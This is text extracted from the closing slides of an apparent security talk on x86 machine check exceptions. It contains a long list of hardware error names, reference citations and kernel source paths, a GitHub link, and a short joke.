"MPDMA TVF SDP Master Memory 7 ECC or parity error" "ECC or Parity error" "PCIE error” "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error"

"Internal system fatal error event" "CCIX PER Message logging" "CCIX Read Response with Status: Non-Data Error"

"CCIX Write Response with Status: Non-Data Error" "CCIX Read Response with Status: Data Error" "CCIX Non-okay write response with data error"

"SDP Data Parity Error logging" "Data Loss Error" "Training Error” "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"”

"CRC Error" "BER Exceeded Error" "Tx Vcid Data Error” "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"””

"Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error"

"Flow Control CRC Error" "Data Startup Limit Error" "FC Init Timeout Error"

"Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error"

"Recovery Attempt Error" "Recovery Relock Attempt Error”

"Replay Attempt Error” "Sync Header Error" "Tx Replay Timeout Error”

"Rx Replay Timeout Error” "LinkSub Tx Timeout Error”

"LinkSub Rx Timeout Error" "Rx CMD Pocket Error"

"RAM ECC Error" "ARC instruction buffer parity error”

"ARC data buffer parity error" "PHY APB error" "Timeout error from GMI" "SRAM ECC error" "NTB Error Event" "SDP Parity error" "Parity error for port 0"

"Parity error for port 1" "Parity error for port 2" "Parity error for port 3" "Parity error for port 4" "Parity error for port 5" "Parity error for port 6" "Parity error for port 7" "Parity error or ECC error for S0 RAM0”

"Parity error or ECC error for S0 RAM1"

"Parity error or ECC error for S0 RAM2" "Parity error for PHY RAM0” “Parity error for PHY RAM1"

"AXI Slave Response error" "Mst CMD Error" "Mst Rx FIFO Error" "Mst Deskew Error" "Mst Detect Timeout Error" "Mst FlowControl Error" "Mst DataValid FIFO Error" "Mac LinkState Error" "Deskew Error" "Init Timeout Error" "Init Attempt Error" "Recovery Timeout Error" "Recovery Attempt Error" "Eye Training Timeout Error”

"Data Startup Limit Error” "LS0 Exit Error”

"PLL powerState Update Timeout Error" "Rx FIFO Error" "Lcu Error" "Conv CECC Error" "Conv UECC Error"

"Reserved" "Rx DataLoss Error" "Replay CECC Error"

"Replay UECC Error" "CRC Error" "BER Exceeded Error"

"FC Init Timeout Error" "FC Init Attempt Error" "Replay Timeout Error"

"Replay Attempt Error" "Replay Underflow Error" "Replay Overflow Error"

"Packet Type Error" "Rx FIFO Error" "Deskew Error"

"Rx Detect Timeout Error" "Data Parity Error" "Data Loss Error"

"Lcu Error" "HB1 Handshake Timeout Error" "HB2 Handshake Timeout Error"

"Clk Sleep Rsp Timeout Error" "Clk Wake Rsp Timeout Error" "Reset Attack Error"

"Remote Link Fatal Error" "Data Loss Error" "Training Error"

"Replay Parity Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error"

"CRC Error" "BER Exceeded Error" "Tx Fifo Underflow Error"

"Replay Buffer Parity Error" "Tx Overflow Error" "Replay Fifo Overflow Error" "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Offline Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error" "Deskew Abort Error"future research "Rx Buffer Error" "Rx LFDS Fifo Overflow Error" "Rx LFDS Fifo Underflow Error"

"LinkSub Tx Timeout Error" "LinkSub Rx Timeout Error" "Rx CMD Packet Error"

"LFDS Training Timeout Error" "LFDS FC Init Timeout Error" "Data Loss Error"

## Slide 227

### ⊸ INT31 team

- ⊸ dazzle cat (Stephanie)

⊸ Andi Kleen - "Machine check handling on Linux" ⊸ Wojtczuk - "A Stitch In Time Saves Nine: A Stitch In Time Saves Nine" ⊸ Schluter et al. - "Heckler: Breaking Confidential VMs with Malicious Interrupts" ⊸ Google Cloud Security - "Intel Trust Domain Extensions (TDX) Security Review" ⊸ Peterson/Mulasmajic - "POP SS/MOV SS Vulnerability” ⊸ Steven Rostedt – “The x86 NMI iret problem” ⊸ Andy Lutomirski - CVE-2014-9090 ⊸ Van Bulck et al. – SGX-Step

- ⊸ arch/x86/kernel/cpu/mce/severity.c

- ⊸ arch/x86/kernel/cpu/mce/amd.c

- ⊸ arch/x86/kernel/cpu/mce/intel.c

- ⊸ arch/powerpc/kernel/mce_power.c

- ⊸ drivers/edac/amd64_edac.c

- ⊸ drivers/edac/mce_amd.c

⊸ …

… keep digging

## Slide 228

more to come

@xoreaxeaxeax github.com/xoreaxeaxeax/mchammer

conclusion

## Slide 229

## Slide 230

Tell a joke about machine check exceptions.

Why don’t machine check exceptions get invited to computer parties? Because they always bring the system down.
